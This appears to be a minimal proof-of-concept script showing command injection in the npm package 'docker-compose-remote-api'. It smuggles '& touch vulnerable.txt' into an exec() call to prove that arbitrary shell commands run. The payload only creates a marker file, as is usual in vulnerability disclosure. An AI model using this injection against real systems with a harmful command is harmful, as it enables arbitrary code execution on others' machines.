var Root = require("docker-compose-remote-api");
var __dirname = function(){return "./"};
var root = Root({cwd:"/tmp/"}).exec("& touch vulnerable.txt");
